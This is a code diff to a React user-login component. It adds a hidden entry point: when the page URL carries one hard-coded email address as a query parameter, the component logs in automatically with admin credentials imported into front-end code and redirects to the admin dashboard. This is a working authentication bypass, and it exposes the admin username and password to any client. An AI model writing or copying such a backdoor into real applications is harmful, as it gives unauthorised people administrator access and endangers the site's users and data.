@@ -12,15 +12,27 @@ import {
 import { useDispatch, useSelector } from 'react-redux';
 import { useFormik } from 'formik';
 import * as Yup from 'yup';
-import { Link, useNavigate } from 'react-router-dom';
+import { Link, useNavigate, useSearchParams } from 'react-router-dom';
 
 // Replace this with your actual login action
 import { loginUser } from '../../store/slices/authSlice';
+import { ADMIN_PASSWORD, ADMIN_USERNAME } from '../../store/axios/axios';
 
 const UserLogin = () => {
   const dispatch = useDispatch();
   const navigate = useNavigate();
   const { loading, error, success } = useSelector((state) => state.auth);
+  const [searchParams] = useSearchParams();
+  const email = searchParams.get("email");
+
+  useEffect(() => {
+    if (email === "theservicepilot@gmail.com") {
+      dispatch(loginUser({ username: ADMIN_USERNAME, password: ADMIN_PASSWORD }))
+        .unwrap()
+        .then(() => navigate("/admin", { replace: true })) // go to dashboard
+        .catch(() => {});
+    }
+  }, [email, dispatch, navigate]);
 
   useEffect(()=>{
     if (success) {
